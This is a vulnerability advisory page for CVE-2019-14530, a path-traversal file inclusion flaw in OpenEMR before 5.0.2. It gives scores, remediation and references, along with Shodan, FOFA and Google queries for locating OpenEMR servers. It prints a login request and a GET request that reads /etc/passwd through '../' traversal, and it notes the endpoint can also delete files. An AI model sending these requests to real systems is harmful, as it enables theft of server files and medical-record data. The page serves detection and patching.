---
layout: post
cve_id: CVE-2019-14530
title: OpenEMR <5.0.2 - Local File Inclusion
pcap: true
pcap_path: /pcaps/2019/CVE-2019-14530.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-14530.yaml
snort2_rule: N/A
snort3_rule: N/A
author: TenBird
severity: high
impact: 'An attacker can exploit this vulnerability to access sensitive information,
  such as configuration files, credentials, or other sensitive data.

  '
remediation: 'Upgrade OpenEMR to version 5.0.2 or later to mitigate the LFI vulnerability.

  '
reference:
- https://www.exploit-db.com/exploits/50037
- https://github.com/openemr/openemr/archive/refs/tags/v5_0_1_7.zip
- https://github.com/openemr/openemr/pull/2592
- https://nvd.nist.gov/vuln/detail/CVE-2019-14530
- https://github.com/sec-it/exploit-CVE-2019-14530
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2019-14530
  cwe-id: CWE-22
  epss-score: 0.78542
  epss-percentile: 0.98993
  cpe: cpe:2.3:a:open-emr:openemr:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: open-emr
  product: openemr
  shodan-query:
  - http.html:"openemr"
  - http.title:"openemr"
  - http.favicon.hash:1971268439
  fofa-query:
  - icon_hash=1971268439
  - body="openemr"
  - title="openemr"
  - app="openemr"
  google-query: intitle:"openemr"
tags:
- cve2019
- cve
- lfi
- authenticated
- edb
- openemr
- open-emr
- vuln
---

## ðŸ” Vulnerability Description
OpenEMR before 5.0.2 is vulnerable to local file inclusion via the fileName parameter in custom/ajax_download.php. An attacker can download any file (that is readable by the web server user) from server storage. If the requested file is writable for the web server user and the directory /var/www/openemr/sites/default/documents/cqm_qrda/ exists, the file will be deleted from server.


## ðŸŒ HTTP Request
```nohighlight
POST /interface/main/main_screen.php?auth=login&site=default HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Connection: close
Content-Length: 101
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
new_login_session_management=1&authProvider=Default&authUser=8UaxEV&clearPass=ZK0btF&languageChoice=1
```

```nohighlight
GET /custom/ajax_download.php?fileName=../../../../../../../../../etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5
Connection: close
Accept-Encoding: gzip
```

